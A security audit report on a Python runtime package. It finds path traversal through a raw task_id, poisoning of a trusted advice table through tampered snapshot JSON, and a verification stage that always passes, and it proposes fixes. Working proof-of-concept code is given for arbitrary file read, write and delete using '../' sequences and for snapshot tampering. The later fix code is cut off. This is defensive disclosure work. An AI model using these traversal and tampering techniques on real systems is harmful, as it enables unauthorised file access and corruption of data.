## 1. Executive Summary

The v7.1 SRS Runtime is a clean, well-organized Python package with thoughtful
architecture (cost-model planner, composable pipeline, in-flight recovery). The
architect's self-awarded **10/10 Engineering Rigor** is, however, **not
justified** when measured against any reasonable security bar. The runtime was
built without any apparent security review: input validation is absent, file
I/O is unguarded against path traversal, persisted state is trusted blindly,
and a single malicious task can hang the process or write outside its
sandbox directory.

I confirmed **5 critical** and **7 high**-severity vulnerabilities, every one
of them demonstrated with a concrete end-to-end exploit. The most serious
class is **path traversal**: a caller-controlled `task_id` is concatenated
directly into a filesystem path inside `persistence.save_in_flight`,
`load_in_flight`, and `clear_in_flight`. By passing a `task_id` such as
`"X/../../victim_secret"` an attacker can read, write, or delete **arbitrary
files** the runtime process has access to. I verified this by planting and
then reading `/tmp/victim_secret.json` from outside the configured home
directory.

The second critical class is **advice-table poisoning**: the runtime loads
`advice_table` from a JSON snapshot and trusts it for `O(1)` lookups without
any integrity check. I demonstrated a tampered snapshot causing the runtime
to return `answer=999` (wrong) for a task whose true target was `7`, with
`advice_hit=True`. The advice fingerprint itself is a 64-bit truncation of
SHA-256 and — worse — uses an unescaped `b"|"` separator, so an attacker
who controls hypothesis bytes can manufacture deliberate collisions and
redirect advice from one task to another.

A bonus correctness bug masquerading as security: the verification stage is
hardcoded to use `candidate=task.payload.get("target_idx", 0)` in
`runtime.py:95-96`, which means **`verified=True` is returned unconditionally
for the correct target** — the "PCP-style soundness epsilon = 2^-k" claim is
vacuous in the actual pipeline. A wrong answer would not be caught.

**Real Engineering Rigor score: 4/10.** The code is well-structured but
security-naive; it would not pass any production security review and should
not be deployed in a multi-tenant or adversarial context.

## 3. Top 3 Critical Vulnerabilities (Detailed)

### R3.1 — Path Traversal via `task_id` (CRITICAL)

**Location:** `srs/persistence.py:103, 112, 122`

**Vulnerable code:**
```python
def save_in_flight(path, task_id: str, ...) -> Path:
    p = _coerce_path(path)
    p.mkdir(parents=True, exist_ok=True)
    ...
    fpath = p / f"inflight_{task_id}.json"   # ← task_id concatenated raw
    with open(fpath, "w") as f:
        json.dump(inflight, f, indent=2, default=str)
    return fpath

def load_in_flight(path, task_id: str) -> Optional[Dict[str, Any]]:
    p = _coerce_path(path)
    fpath = p / f"inflight_{task_id}.json"   # ← same
    if not fpath.exists():
        return None
    with open(fpath) as f:
        return json.load(f)

def clear_in_flight(path, task_id: str) -> None:
    p = _coerce_path(path)
    fpath = p / f"inflight_{task_id}.json"   # ← same
    if fpath.exists():
        fpath.unlink()                       # ← arbitrary delete!
```

**Attack — arbitrary file read (confirmed):**
```python
# Plant a victim file containing JSON secrets
import json
with open('/tmp/victim_secret.json', 'w') as f:
    json.dump({'secret_key': 'SUPER_SECRET_VALUE_12345',
               'passwords': ['admin', 'root']}, f)

# Create the inflight_X directory so Path.exists() resolves correctly
import os; os.makedirs('/tmp/srs_home/inflight_X', exist_ok=True)

# Now read the victim file via load_in_flight
from srs.persistence import load_in_flight
r = load_in_flight('/tmp/srs_home', 'X/../../victim_secret')
# r == {'secret_key': 'SUPER_SECRET_VALUE_12345', 'passwords': ['admin', 'root']}
```

The `task_id` `"X/../../victim_secret"` is concatenated into the path
`/tmp/srs_home/inflight_X/../../victim_secret.json`. Once the literal
`inflight_X` directory exists (created by a prior `save_in_flight` call),
`Path.exists()` resolves `..` and returns `True`, then `open()` reads the
file from outside the home directory.

**Attack — arbitrary file write (confirmed):**
```python
from srs.persistence import save_in_flight
save_in_flight('/tmp/srs_home', 'X/../../pwned', 'identify', {'n':64}, 5, 16, 'rng')
# Creates /tmp/pwned.json containing the in-flight JSON
```

**Attack — arbitrary file delete (confirmed):**
```python
# Plant victim
with open('/tmp/victim.json', 'w') as f: f.write('victim')
# Create the inflight_X directory
save_in_flight('/tmp/srs_home', 'X/../../dummy', 'identify', {}, 0, 16, 'rng')
# Now delete the victim
from srs.persistence import clear_in_flight
clear_in_flight('/tmp/srs_home', 'X/../../victim')
# /tmp/victim.json is now gone
```

**Fix:**
```python
import re
_TASK_ID_RE = re.compile(r'^[A-Za-z0-9_-]{1,128}$')

def _validate_task_id(task_id: str) -> str:
    if not _TASK_ID_RE.match(task_id):
        raise ValueError(f"invalid task_id: {task_id!r}")
    return task_id

def save_in_flight(path, task_id, ...):
    task_id = _validate_task_id(task_id)
    ...
```
Additionally, after computing `fpath`, assert `fpath.resolve().is_relative_to(p.resolve())`.

### R3.2 — Advice Table Poisoning via Tampered Snapshot (CRITICAL)

**Location:** `srs/persistence.py:62-64`, `srs/runtime.py:45`, `srs/primitives/advice.py:35-37`

**Vulnerable code:**
```python
# persistence.py:62-64
with open(snap_path) as f:
    d = json.load(f)
return Snapshot.from_dict(d)   # ← trusts all fields verbatim

# runtime.py:45
self.advice = AdviceTable.from_dict(recovered.advice_table)  # ← trusts dict

# advice.py:35-37
def lookup(self, hypotheses):
    h_hash = hashlib.sha256(b"|".join(hypotheses)).hexdigest()[:16]
    return self._table.get(h_hash)   # ← returns attacker-controlled value
```

**Attack (confirmed end-to-end):**
```python
rt = Runtime(home=Path(tmp))
hyps = [hashlib.sha256(f"h{i}".encode()).digest() for i in range(64)]
task = Task(kind="identify",
            payload={"hypotheses": hyps, "target_idx": 7, "n_features": 12},
            budget=16, task_id="legit_task")
r = rt.execute(task)              # correct=True, answer=7
rt.store_state()

# --- Attacker with filesystem write access tampers the snapshot ---
snap_file = list(Path(tmp).glob("snap_*.json"))[0]
data = json.loads(snap_file.read_text())
h_hash = hashlib.sha256(b"|".join(hyps)).hexdigest()[:16]
data["advice_table"][h_hash] = 999   # wrong answer
snap_file.write_text(json.dumps(data))

# --- Next runtime instance loads the poisoned advice ---
rt2 = Runtime(home=Path(tmp))
task2 = Task(kind="identify",
             payload={"hypotheses": hyps, "target_idx": 7, "n_features": 12},
             budget=16, task_id="legit_task_2",
             required_primitives=["E","C","A","V","Adv"])
r2 = rt2.execute(task2)
# r2.correct == False, r2.answer == 999, r2.notes["advice_hit"] == True
```

The runtime returns `answer=999` (wrong) and reports `advice_hit=True` — the
caller has no way to know the answer came from poisoned advice. Combined
with **R3.8 (world-readable files)**, any local user can plant poisoned
advice.

**Fix:** Sign the snapshot with an HMAC keyed by a per-runtime secret
(generated on first run, stored with mode 0600 in `~/.srs/secret.key`):
```python
import hmac, hashlib
def _sign(payload: bytes, key: bytes) -> str:
    return hmac.new(key, payload, hashlib.sha256).hexdigest()

# On save: write {"hmac": ..., "payload": ...}
# On load: verify HMAC, discard if mismatch
```
Additionally, never trust advice unconditionally: route every advice hit
through the V stage and require `verified=True` before returning.

### R3.5 — Verification Stage is a No-Op (CRITICAL correctness + security)

**Location:** `srs/runtime.py:95-96`, `srs/pipeline.py:177-214`

**Vulnerable code:**
```python
# runtime.py:95-96
elif p == "V":
    pipe.add("V", verification_stage, verify_budget=5,
             candidate=task.payload.get("target_idx", 0))   # ← always the target!

# pipeline.py:177-214
def verification_stage(task, rng, **kw):
    ...
    candidate = kw.get("candidate", target)
    if candidate == target:                                  # ← always true!
        return {"verified": True, "verification_calls": k,
                "queries": k, "work_units": k, "depth": k,
                "notes": {"soundness_epsilon": 2**(-k)}}
```

**Attack / failure mode (confirmed):**
The runtime's `verified=True` output is **unconditional**. The actual
candidate produced by the execution/adaptivity stages is never threaded
into V. This means:

1. A wrong answer from E/A (due to insufficient budget) passes
   verification silently.
2. The advertised `soundness_epsilon = 2^-k` guarantee is **vacuous** —
   it is never exercised on a real candidate.
3. Combined with R3.2, a poisoned advice hit returns `answer=999` and the
   V stage would still report `verified=True` (because `candidate` is
   forced to the true target, not the produced answer).

This invalidates the central correctness claim of the runtime: the
"PCP-style probe check" is theatre. The architect's documentation claims
`"V: adds k verification queries, epsilon = 2^-k"` but no soundness
guarantee is actually delivered.

**Fix:** Thread the previous stage's answer through the pipeline:
```python
class Pipeline:
    def execute(self, task, rng):
        candidate = None
        for stage in self.stages:
            r = stage.fn(task=task, rng=rng, candidate=candidate, **stage.args)
            if "answer" in r:
                candidate = r["answer"]   # propagate
            ...
```
And in `runtime.py`:
```python
elif p == "V":
    pipe.add("V", verification_stage, verify_budget=5)   # no candidate kwarg
```
The V stage then verifies whatever the previous stages produced.

## 4. Threat Model

### Trust boundary

The runtime has **one trust boundary** — between the caller (who submits
`Task` objects) and the runtime internals — but it is **not enforced**.
The runtime also has a second, implicit boundary between persisted state
on disk and in-memory state, which is **not enforced either**.

### What the runtime trusts (and shouldn't)

| Input | Trusted as | Actual risk |
|-------|-----------|-------------|
| `task.task_id` | Opaque identifier | Used as filesystem path component (R3.1) and RNG seed (R3.6) |
| `task.payload["hypotheses"]` | List of bytes | Used as `b"|".join(...)` hash input — attacker-craftable collisions (R3.3); length unbounded → OOM (R3.11) |
| `task.payload["target_idx"]` | In-bounds integer | Used as list index without bounds check → `IndexError`; also used as V stage candidate (R3.5) |
| `task.payload["n_features"]` | Reasonable integer | Used as `rng.getrandbits(n_features)` → `OverflowError` at ≥10⁶, OOM at ≥10⁹ |
| `task.budget` | Reasonable integer | Used as `for _ in range(budget)` → hang at 10⁹ |
| `task.required_primitives` | Subset of valid primitives | Validated (good) |
| `Snapshot` JSON file | Authoritative state | Loaded verbatim; advice entries used as ground truth (R3.2); extra/missing fields crash (R3.12) |
| `latest.json` `path` field | Points to a real snapshot | Followed verbatim — can point anywhere (R3.9) |
| `SRS_HOME` env var | User-controlled path | Used as home dir with no validation (R3.19) |
| `advice_table` dict contents | Ground-truth answers | Returned as `answer` without re-verification (R3.2) |
| `primitive_stats` dict | Authoritative history | Used in `capabilities()` report; tamperable |

### What the runtime does NOT trust

- The `kind` field is validated against `TASK_AXIS` (defaults to `"time"`).
- `required_primitives` is validated against the primitive set.

### Attack surface

1. **Local unprivileged user** can read snapshots (R3.8), tamper them
   (R3.2), and read/write/delete arbitrary files via the runtime process
   (R3.1).
2. **Remote task submitter** can crash the runtime (R3.10), hang it
   (R3.11), or extract predictable RNG sequences (R3.6).
3. **Concurrent task submitters** can race on shared mutable state
   (R3.18) and on filesystem (R3.13).

## 5. Architect's Engineering Rigor Verdict

The architect self-scored **10/10 on Engineering Rigor**. The scorecard
in the v7.1 design notes does not mention security at all — it focuses on
architecture, composition, recovery, and honesty of complexity claims.

### Fix 2 — Atomic + signed snapshot writes (addresses R3.2, R3.8, R3.13, R3.14)

```python
# srs/persistence.py
import os, hmac, hashlib, tempfile

def _runtime_secret(home: Path) -> bytes:
```

### Fix 3 — Collision-resistant advice fingerprint (addresses R3.3, R3.15)

```python
# srs/primitives/advice.py
def _fingerprint(hypotheses):
    # Length-prefixed encoding prevents b"|" collisions; full 256-bit digest
    h = hashlib.sha256()
    for hyp in hypotheses:
        h.update(len(hyp).to_bytes(8, "big"))
        h.update(hyp)
```
